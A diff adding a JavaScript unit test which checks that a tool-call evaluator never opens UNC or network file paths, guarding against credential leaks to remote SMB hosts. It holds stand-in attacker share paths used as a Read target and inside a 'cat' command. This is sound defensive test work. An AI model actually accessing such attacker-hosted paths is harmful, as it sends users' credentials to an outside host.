@@ -86,3 +86,13 @@ test('Bash: background commands and unknown tools are ignored', () => {
   assert.equal(evaluate('Bash', { command: 'npm install', run_in_background: true }, ctx), null);
   assert.equal(evaluate('Edit', { file_path: big }, ctx), null);
 });
+
+test('never opens UNC/network paths (no credential leak to remote SMB hosts)', () => {
+  let opened = false;
+  const spy = () => { opened = true; return { lines: 5000, bytes: 1, truncated: false, binary: false }; };
+  for (const p of [String.raw`\\attacker\share\x.log`, '//attacker/share/x.log']) {
+    assert.equal(evaluate('Read', { file_path: p }, { ...ctx, countLines: spy }), null, p);
+    assert.equal(evaluate('Bash', { command: `cat ${p}` }, { ...ctx, countLines: spy }), null, p);
+  }
+  assert.equal(opened, false);
+});
